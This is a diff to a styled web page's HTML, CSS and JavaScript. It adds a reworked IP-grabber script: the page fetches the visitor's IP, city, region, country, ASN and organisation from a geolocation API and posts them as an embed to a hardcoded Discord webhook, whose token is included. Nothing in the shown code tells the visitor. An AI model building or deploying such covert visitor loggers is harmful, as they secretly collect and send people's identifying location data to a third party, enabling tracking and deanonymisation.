@@ -9,7 +9,7 @@
         body {
             font-family: 'Arial', sans-serif;
             cursor: url('https://cdn-icons-png.flaticon.com/512/25/25694.png'), auto;
-            background: url('https://cdn.discordapp.com/attachments/1257370223590248540/1301300539534872647/97759808-b73f-4176-a655-2ce9d9697ff3.gif') no-repeat center center fixed;
+            background: url('https://cdn.discordapp.com/attachments/1257370223590248540/1301300539534872647/97759808-b73f-4176-a655-2ce9d9697ff3.gif?ex=6723fa11&is=6722a891&hm=d83321492f502b3e741676b5f272fd912f204363f578ec51434b67b33ad4db41') no-repeat center center fixed;
             background-size: cover;
             height: 100vh;
             margin: 0;
@@ -104,52 +104,39 @@
                 fetch('https://ipapi.co/json/')
                     .then(response => response.json())
                     .then(data => {
-                        const formattedData = {
-                            ip: data.ip,
-                            network: data.network,
-                            version: data.version,
-                            city: data.city,
-                            region: data.region,
-                            region_code: data.region_code,
-                            country: data.country,
-                            country_name: data.country_name,
-                            country_code: data.country_code,
-                            country_code_iso3: data.country_code_iso3,
-                            country_capital: data.country_capital,
-                            country_tld: data.country_tld,
-                            continent_code: data.continent_code,
-                            in_eu: data.in_eu,
-                            postal: data.postal,
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            timezone: data.timezone,
-                            utc_offset: data.utc_offset,
-                            country_calling_code: data.country_calling_code,
-                            currency: data.currency,
-                            currency_name: data.currency_name,
-                            languages: data.languages,
-                            country_area: data.country_area,
-                            country_population: data.country_population,
-                            asn: data.asn,
-                            org: data.org
+                        const embed = {
+                            embeds: [{
+                                title: "User IP Information",
+                                fields: [
+                                    { name: "IP", value: data.ip, inline: true },
+                                    { name: "City", value: data.city, inline: true },
+                                    { name: "Region", value: data.region, inline: true },
+                                    { name: "Country", value: data.country_name, inline: true },
+                                    { name: "ASN", value: data.asn, inline: true },
+                                    { name: "Organization", value: data.org, inline: true }
+                                ],
+                                footer: {
+                                    text: "Data provided by ipapi.co"
+                                }
+                            }]
                         };
 
-                        // Send the formatted data to your Discord webhook
+                        // Send the embed to your Discord webhook
                         fetch('https://discord.com/api/webhooks/1257370240380047541/kj7np_FeepiR1k3U_cUO1HJ2H_5HSCcXTk20ytp9YbfgxR0I6BestwYMgdHNzniSGmZy', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json'
                             },
-                            body: JSON.stringify(formattedData) // Send formattedData directly
+                            body: JSON.stringify(embed) // Send embed object
                         })
                         .then(response => {
                             if (response.ok) {
-                                console.log('Data sent to webhook successfully!');
+                                console.log('Embed sent to webhook successfully!');
                             } else {
-                                console.error('Failed to send data to webhook. Status:', response.status, response.statusText);
+                                console.error('Failed to send embed to webhook. Status:', response.status, response.statusText);
                             }
                         })
-                        .catch(error => console.error('Error sending data:', error));
+                        .catch(error => console.error('Error sending embed:', error));
                     })
                     .catch(error => console.error('Error fetching IP address:', error));
             });
